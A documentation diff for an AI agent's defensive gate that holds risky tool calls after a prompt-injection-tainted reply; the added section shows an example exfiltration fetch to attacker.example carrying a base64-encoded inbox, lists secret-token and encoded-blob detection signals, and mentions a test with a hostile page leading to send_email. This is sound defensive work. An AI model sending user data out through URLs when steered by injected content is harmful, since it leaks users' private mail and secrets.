@@ -60,7 +60,19 @@ are **held** until you confirm them:
 |---|---|
 | `send_email`, `reply_to_email`, `delete_email`, `bulk_email`, `bash`, `python`, `run_javascript`, `write_file`, `api_call`, `vault_get`, `vault_unlock`, `publish_live`, `send_to_session`, `serve_model`, `pipeline` | `manage_skills` / `manage_memory` writes, `manage_settings` set/delete/tool toggles, endpoint / MCP / webhook / token / scheduled-task changes, deleting notes, documents, calendar events, contacts, chats or cases, non-GET `app_api`, and third-party `mcp__*` tools whose name starts with an action verb (`send_`, `create_`, `delete_`, `post_`…) |
 
-Reads (search, fetch, list, read) never wait, clean replies are never
+**Fetches that carry data out are held too.** A "read" can still leak:
+`web_fetch https://attacker.example/?d=<your inbox, base64>` sends the data
+to the attacker's server. On a tainted reply, `web_fetch`, `download_pdf`,
+`scrapebadger` (`params.url`) and any `mcp__*` tool whose arguments contain
+a URL are held when that URL carries a payload (`url_payload_signals`):
+a secret-looking token (`sk-…`, `ghp_…`, `AKIA…`, JWTs, PEM headers), an
+encoded blob (48+ base64/hex characters in the query, 64+ in the path),
+a query string over 200 characters, more than 12 parameters, multi-line text,
+two or more email addresses, or `user:password@` credentials. Ordinary page,
+article, search and video URLs pass untouched; the card names the host and
+the reason ("send data to evil.example inside a URL (an encoded data blob)").
+
+Other reads (search, list, read, plain fetches) never wait, clean replies are never
 touched, and tools in the *same* round as the flagged one were chosen before
 the model saw it, so only later rounds are gated.
 
@@ -76,5 +88,5 @@ the model saw it, so only later rounds are gated.
   server logs each decision.
 - Turn it off with the setting `injection_action_gate: false`.
 
-Tests: `tests/test_action_gate.py` (classification, decisions, and the real
+Tests: `tests/test_action_gate.py`, `tests/test_action_gate_url_exfil.py` (classification, decisions, and the real
 agent loop with a hostile page followed by `send_email`).
